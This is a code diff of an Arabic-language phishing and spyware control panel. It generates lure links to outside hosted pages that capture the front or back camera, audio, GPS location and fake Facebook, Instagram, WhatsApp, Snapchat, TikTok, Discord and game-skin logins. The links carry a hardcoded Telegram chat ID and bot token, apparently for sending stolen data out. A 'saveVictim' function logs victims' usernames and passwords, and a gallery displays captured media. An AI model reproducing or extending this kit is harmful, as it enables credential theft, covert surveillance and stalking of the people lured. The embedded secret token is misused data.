-    if(navigator.clipboard){navigator.clipboard.writeText(link).then(function(){showToast();}).catch(function(){alert(link);});}
-    else{var t=document.createElement('textarea');t.value=link;t.style.position='fixed';t.style.opacity='0';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showToast();}
-}
-
-function showToast() {
-    var toast=document.createElement('div');toast.className='copy-toast';toast.textContent='💀 تم النسخ! 💀';
-    document.body.appendChild(toast);playSound('copy');
-    setTimeout(function(){toast.style.opacity='0';toast.style.transform='translateX(-50%) translateY(-20px)';toast.style.transition='all 0.3s ease';
-    setTimeout(function(){toast.remove();},300);},1500);
-}
-
-// ========== INIT ==========
-loadFirebaseConfig();
-
-var auth=localStorage.getItem('master_auth');
-if(auth && botToken && chatId){
-    loadFirebaseConfig().then(function(){
-        if(isValidCode(auth)){
-            showPage('page-tools');
-            document.getElementById('setup-badge').textContent='💀 '+chatId;
+// ========== معرض ==========
+function loadGallery() {
+    var data = getLocalData();
+    var html = '';
+    
+    (data.gallery || []).reverse().forEach(g => {
+        if (g.url) {
+            html += '<div class="gallery-item" onclick="openMedia(\'' + g.url + '\',\'image\')"><img src="' + g.url + '" alt=""></div>';
         }
     });
+    
+    (data.videos || []).reverse().forEach(v => {
+        if (v.url) {
+            html += '<div class="gallery-item" onclick="openMedia(\'' + v.url + '\',\'video\')"><video src="' + v.url + '"></video><div class="play-icon">▶</div></div>';
+        }
+    });
+    
+    document.getElementById('gallery-grid').innerHTML = html || '<div class="empty">📭 المعرض فارغ</div>';
 }
 
-document.getElementById('code-input').addEventListener('keydown',function(e){if(e.key==='Enter')checkCode();});
-document.addEventListener('click',function(){getAudioCtx();},{once:true});
+function openMedia(url, type) {
+    if (type === 'video') {
+        document.getElementById('modalImg').style.display = 'none';
+        document.getElementById('modalVid').style.display = 'block';
+        document.getElementById('modalVid').src = url;
+    } else {
+        document.getElementById('modalVid').style.display = 'none';
+        document.getElementById('modalImg').style.display = 'block';
+        document.getElementById('modalImg').src = url;
+    }
+    document.getElementById('modal').classList.add('show');
+}
+
+function closeModal() {
+    document.getElementById('modal').classList.remove('show');
+    document.getElementById('modalVid').pause();
+}
+
+// ========== أدوات ==========
+function loadTools() {
+    var tools = [
+        {name:'كاميرا أمامية',icon:'📸',page:'photo-front.html'},
+        {name:'كاميرا خلفية',icon:'📷',page:'photo-back.html'},
+        {name:'فيديو أمامي',icon:'🎥',page:'mm.html'},
+        {name:'فيديو خلفي',icon:'📹',page:'video-back.html'},
+        {name:'GPS',icon:'📍',page:'location.html'},
+        {name:'صوت',icon:'🎙️',page:'audio.html'},
+        {name:'فيسبوك',icon:'📘',page:'fb.html'},
+        {name:'انستجرام',icon:'📷',page:'insta.html'},
+        {name:'واتساب',icon:'💬',page:'whatsapp.html'},
+        {name:'تويتر',icon:'𝕏',page:'twitter.html'},
+        {name:'سناب',icon:'👻',page:'snapchat.html'},
+        {name:'تيك توك',icon:'🎵',page:'tiktok.html'},
+        {name:'PUBG',icon:'🔫',page:'g.html'},
+        {name:'فري فاير',icon:'🎯',page:'freefire.html'},
+        {name:'ديسكورد',icon:'💎',page:'discord.html'},
+        {name:'بث مباشر',icon:'🎥',page:'live.html'}
+    ];
+    
+    var html = '';
+    tools.forEach(t => {
+        var isBlocked = blockedTools.indexOf(t.page) !== -1;
+        html += '<div class="tool-card' + (isBlocked ? ' blocked' : '') + '" onclick="' + (isBlocked ? '' : 'copyToolLink(\'' + t.page + '\')') + '"><span class="icon">' + t.icon + '</span>' + t.name + (isBlocked ? ' 🔒' : '') + '</div>';
+    });
+    document.getElementById('tools-grid').innerHTML = html;
+}
+
+function copyToolLink(page) {
+    var base = (['photo-front.html','photo-back.html','mm.html','video-back.html','location.html','audio.html','g.html','fb.html','insta.html','whatsapp.html','twitter.html','snapchat.html','tiktok.html'].indexOf(page) !== -1) ? 'https://ai-proxy-eosin.vercel.app' : 'https://pubgskin.vercel.app';
+    var link = base + '/' + page + '?chatId=7276604783&token=8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+    navigator.clipboard.writeText(link).then(() => alert('✅ تم نسخ الرابط!')).catch(() => prompt('انسخ:', link));
+}
+
+// ========== رفع ==========
+function previewUpload() {
+    var f = document.getElementById('uploadFile').files[0];
+    if (!f) return;
+    var reader = new FileReader();
+    reader.onload = function(e) {
+        var html = f.type.startsWith('image/') ? '<img src="' + e.target.result + '" style="max-width:100%;max-height:200px;border-radius:8px;">' : '<video src="' + e.target.result + '" controls style="max-width:100%;max-height:200px;border-radius:8px;"></video>';
+        document.getElementById('uploadPreview').innerHTML = html;
+    };
+    reader.readAsDataURL(f);
+}
+
+async function uploadMedia() {
+    var f = document.getElementById('uploadFile').files[0];
+    if (!f) return alert('اختر ملف');
+    
+    var reader = new FileReader();
+    reader.onload = function(e) {
+        var isVideo = f.type.startsWith('video/');
+        saveToLocal(isVideo ? 'video' : 'photo', {
+            url: e.target.result,
+            caption: isVideo ? '🎬 فيديو مرفوع' : '📸 صورة مرفوعة',
+            service: isVideo ? '🎬 فيديو' : '📸 صورة'
+        });
+        alert('✅ تم الرفع! الملف في المعرض');
+        document.getElementById('uploadFile').value = '';
+        document.getElementById('uploadPreview').innerHTML = '';
+    };
+    reader.readAsDataURL(f);
+}
+
+// ========== حفظ بيانات ==========
+function saveVictim() {
+    var service = document.getElementById('v-service').value;
+    var user = document.getElementById('v-user').value.trim();
+    var pass = document.getElementById('v-pass').value.trim();
+    if (!service || !user || !pass) return alert('املأ جميع الحقول');
+    
+    saveToLocal('victim', {
+        service: service,
+        text: '👤 ' + user + ' | 🔒 ' + pass
+    });
+    
+    alert('✅ تم الحفظ في السجل!');
+    document.getElementById('v-user').value = '';
+    document.getElementById('v-pass').value = '';
+}
+
+// ========== بدء ==========
+loadFirebaseConfig();
+loadTools();
 </script>
 </body>
 </html>
